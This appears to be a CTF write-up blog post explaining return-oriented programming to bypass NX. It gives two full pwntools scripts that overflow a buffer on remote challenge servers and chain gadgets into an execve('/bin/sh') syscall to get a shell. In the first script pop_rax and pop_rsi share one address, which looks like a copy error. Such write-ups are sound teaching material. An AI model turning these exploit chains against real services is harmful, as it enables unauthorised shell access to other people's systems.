---
title: ROP WriteUp
date: 2024-08-09 16:05:30
category: 
    - PWN
tags: pwn
---

### Ais3-lys-rop1

>當有NX保護機制時，ROP可以幫助我們繞過他

找gadget把rop chain推成shellcode的形狀

```python
from pwn import *

context.arch = 'amd64'
r = remote("35.229.243.81" ,10101)
# r = process("rop1")

r.sendlineafter(b"name?", b"/bin/sh\x00")

pop_rdi = 0x0000000000401f4f
pop_rdx_rbx = 0x0000000000485bab
pop_rsi = 0x000000000044fd87
pop_rax = 0x000000000044fd87
syscall  =0x0000000000401d04
a_buf = 0x4c7300

p = b'a'*0x18
# p+= p64(pop_rax)+p64(59)
# p+= p64(pop_rsi)+p64(0x0)
# p+= p64(pop_rdi) + p64(a_buf)
# p += p64(pop_rdx_rbx)+p64(0x0)+p64(0x0)
# p += p64(syscall)

p +=flat(
    p64(pop_rax), p64(59),
    p64(pop_rsi) , p64(0x0),
    p64(pop_rdi) , p64(a_buf),
    p64(pop_rdx_rbx),p64(0x0)+p64(0x0),
    p64(syscall)
)


r.sendlineafter(b"vuln:",p)

r.interactive()
```

## ncku-ctf-ezrop

這題跟上面差在需要找到一個位置寫入`/bin/sh`在把rdi指過去，像上面我們把rdi指向name的memory address。
這邊我們利用 `mov qword ptr [rdi], rdx ; ret` 把rdx設為`/bin/sh`後丟到rdi指向的位置。

```python
from pwn import *

# context.terminal = ["tmux",'splitw','-h']
context.arch = 'amd64'

#r = process("./rop")
r = remote("chall.nckuctf.org",10007)

pop_rdi = 0x401e9f
pop_rax = 0x44fd07
pop_rsi = 0x409f0e
pop_rdx_rbx = 0x485a8b 
syscall = 0x401c54
bss = 0x4c5000

mov_rdi_rdx = 0x433463 #  mov qword ptr [rdi], rdx ; ret


p = flat(
    'a'*0x48,
    pop_rdi,
    bss,
    pop_rsi,
    0x0,
    pop_rax,
    0x3b,
    pop_rdx_rbx,
    '/bin/sh\x00',0x0,
    mov_rdi_rdx,
    pop_rdx_rbx,
    0x0,0x0,
    syscall
)

# gdb.attach(r)
r.sendlineafter(b':',p)

r.sendline(b'/home/$(whoami)/flag*')

r.interactive()
```
